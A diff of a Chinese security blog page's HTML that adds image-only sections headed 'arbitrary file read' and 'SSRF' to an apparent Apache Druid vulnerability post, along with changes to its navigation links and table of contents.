+<h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230131104558-a4y67io.png" alt="image.png"></p>
+<h5 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h5><p>该漏洞druid同样已知晓,但是未修复</p>
+<p><img src="/2024/01/30/apache%20druid%20%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230131104704-cmfcch8.png" alt="image.png"></p>
 
     </article>
     <!-- license  -->
@@ -446,17 +454,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2020/03/10/ysoserial%E4%B9%8B%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89payload/" title= "ysoserial之添加自定义payload">
-                    <div class="nextTitle">ysoserial之添加自定义payload</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/03/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" title= "反序列化学习">
-                    <div class="prevTitle">反序列化学习</div>
+                <a href= "/2020/03/16/DolphinPHP%20%E5%85%A8%E7%89%88%E6%9C%AC%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title= "DolphinPHP 全版本后台代码执行漏洞">
+                    <div class="prevTitle">DolphinPHP 全版本后台代码执行漏洞</div>
                 </a>
             
         </li>
@@ -568,7 +571,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#渗透技巧之特殊环境的mssql思路"><span class="toc-number">1.</span> <span class="toc-text">渗透技巧之特殊环境的mssql思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#图片来源真实环境，目前取得都是历史保留"><span class="toc-number">1.0.0.0.1.</span> <span class="toc-text">图片来源真实环境，目前取得都是历史保留</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#尝试挖掘"><span class="toc-number">2.</span> <span class="toc-text">尝试挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#构造PoC"><span class="toc-number">2.0.1.</span> <span class="toc-text">构造PoC</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他漏洞"><span class="toc-number">3.</span> <span class="toc-text">其他漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#任意文件读取"><span class="toc-number">3.0.1.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSRF"><span class="toc-number">3.0.2.</span> <span class="toc-text">SSRF</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
